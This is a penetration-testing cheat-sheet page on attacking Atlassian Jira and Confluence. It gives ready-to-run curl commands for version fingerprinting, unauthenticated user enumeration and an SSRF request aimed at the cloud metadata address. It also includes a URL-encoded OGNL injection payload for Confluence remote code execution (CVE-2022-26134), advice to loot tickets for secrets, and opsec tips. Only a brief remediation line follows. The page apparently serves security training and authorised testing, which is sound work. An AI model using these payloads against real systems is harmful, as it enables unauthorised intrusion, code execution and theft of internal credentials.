---
tags:
  - Web
---

# :material-jira: Atlassian (Jira / Confluence)

<span class="pill pill-hard">SSTI/RCE + info leak</span> <span class="pill pill-info">web</span>

Jira and Confluence hold the company's internal knowledge — tickets, docs, creds
in comments — and both have a long line of **unauth SSRF, info-disclosure, and
OGNL/SSTI RCE** CVEs.

!!! abstract "TL;DR"
    Grab the version from the footer/REST → Jira: user enum + unauth dashboards/SSRF;
    Confluence: OGNL injection RCE (CVE-2022-26134) and the CVE-2023-22515 broken
    access control. Then loot tickets/pages for secrets.

## :material-magnify: Identify

```bash
# Jira
curl -s http://$TARGET/rest/api/2/serverInfo | jq .        # version, build
curl -s "http://$TARGET/secure/QueryComponent!Default.jspa" # unauth in some CVEs
# Confluence
curl -s http://$TARGET/rest/applinks/1.0/manifest          # version
```

!!! loot "Jira info-disclosure classics"
    ```bash
    # CVE-2019-3403 user enum / CVE-2020-14179 hidden fields
    curl -s "http://$TARGET/rest/api/2/user/picker?query=."          # user enum
    # CVE-2019-8451 — unauth SSRF via the plugin servlet
    curl -s "http://$TARGET/plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254@$TARGET"
    ```

## :material-fire: Confluence RCE

```bash
# CVE-2022-26134 — unauth OGNL injection RCE
curl -s "http://$TARGET/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/"
# CVE-2023-22515 — broken access control → create admin
# CVE-2021-26084 — OGNL via Widget Connector (Webwork)
```

!!! opsec "These are mass-exploited — expect monitoring"
    Confluence OGNL CVEs are ransomware favourites; targets are often alert-heavy.
    Confirm the version first and keep PoC traffic minimal.

## :material-shield-check: Remediation

- Patch immediately (Atlassian CVEs are frequent + wormed); restrict admin;
  scrub secrets from tickets/pages; front with a WAF.

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- SSRF → [SSRF](../web/ssrf.md); OGNL → [SSTI](../web/ssti.md); shell → [Linux Privesc](../privesc/linux.md).
- Reference: [HackTricks Jira](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/jira.html).
